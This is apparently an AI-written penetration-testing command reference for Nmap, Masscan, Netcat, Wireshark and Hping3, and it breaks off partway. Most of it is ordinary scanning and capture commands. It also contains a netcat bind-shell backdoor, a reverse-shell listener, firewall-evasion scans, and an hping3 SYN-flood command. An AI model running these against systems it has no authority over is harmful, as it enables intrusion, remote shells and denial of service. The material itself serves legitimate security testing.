Here is the corrected and categorized list of tools and commands for penetration testing, with spelling and formatting errors fixed. Each section and command line has been preserved.

---

## Network Analysis and Scanning Tools

### 1. Nmap (Network Mapper)
Nmap remains the gold standard for network discovery and security auditing, offering unparalleled flexibility in network reconnaissance:
```bash
# Comprehensive network scan with service detection
nmap -sV -sC -O -A -T4 192.168.1.8/24

# Stealth SYN scan with timing optimization
nmap -sS -T2 -p- --max-retries 1 --min-rate 100 target.com

# Script-based vulnerability scanning
nmap --script vuln --script-args=unsafe=1 192.168.1.100

# Advanced firewall evasion techniques
nmap -sS -f --mtu 24 --data-length 1337 -D RND:10 --spoof-mac 0 192.168.1.1

# Custom NSE script execution
nmap --script=http-vuln-* --script-args http-vuln-cve2017-5638.path=/struts2-showcase/ 192.168.1.100

# UDP service discovery
nmap -sU -sV --version-intensity 0 -n -T4 192.168.1.0/24

# IPv6 scanning
nmap -6 -sS -p 88,443,22,21,25 2001:db8::/32
```

### 2. Masscan
Masscan provides Internet-scale port scanning capabilities with extraordinary speed:
```bash
# High-speed port scanning
masscan -p1-65535 192.168.1.0/24 --rate=1800

# Banner grabbing with output formatting
masscan -p80,443,445,22 10.0.0.0/8 --banners --source-port 61800 -o scan_results.json

# Exclude ranges and rate limiting
masscan 0.0.0.0/8 -p80,443 --excludefile exclude.txt --rate=100000

# Custom packet crafting
masscan --ports 0-65535 --adapter-ip 192.168.1.100 --router-mac 00:11:22:33:44:55 192.168.1.0/24
```

### 3. Netcat (nc)
The "Swiss Army knife" of networking tools, essential for various security tasks:
```bash
# Reverse shell listener
nc -nlvp 4444

# Connect to remote port
nc -nv 192.168.1.100 80

# Port scanning
nc -zvn 192.168.1.100 1-1000 2>&1 | grep succeeded

# File transfer
# Receiver:
nc -l -p 1234 > received_file.txt
# Sender:
nc -w 3 192.168.1.100 1234 < file_to_send.txt

# Create backdoor (educational purpose only)
nc -l -p 4444 -e /bin/bash

# UDP connections
nc -u -l -p 1234

# HTTP request crafting
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

### 4. Wireshark
The premier packet analysis tool for deep network inspection:
```bash
# Capture filters for specific traffic
wireshark -i eth0 -f "tcp port 80 and host 192.168.1.100"

# Display filters for analysis
# - HTTP traffic: http
# - HTTPS handshakes: ssl.handshake.type == 1
# - DNS queries: dns.flags.response == 0
# - SYN packets: tcp.flags.syn == 1 && tcp.flags.ack == 0

# Command-line capture with tshark
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri

# Extract files from packet capture
tshark -r capture.pcap --export-objects "http,extracted_files"

# Real-time statistics
tshark -i eth0 -q -z io,stat,1

# Decrypt HTTPS traffic with key
wireshark -o "ssl.keys_list:192.168.1.100,443,http,server.key" -r capture.pcap
```

### 5. Hping3
Advanced packet crafting tool for security testing:
```bash
# SYN flood testing
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com

# Traceroute using different protocols
hping3 --traceroute -V -S -p 80 target.com

# Port scanning with custom flags
hping3 -8 50-60 -S -V target.com

# Firewall testing with fragmentation
hping3 -f -p 80 -S target.com

# Timestamp collection
hping3 -S -p 80 --tcp-timestamp target.com

# Custom packet with data
hping3 -p 80 -S -d 50 -E malicious.txt target.com
```

_(Continued in next response...)_

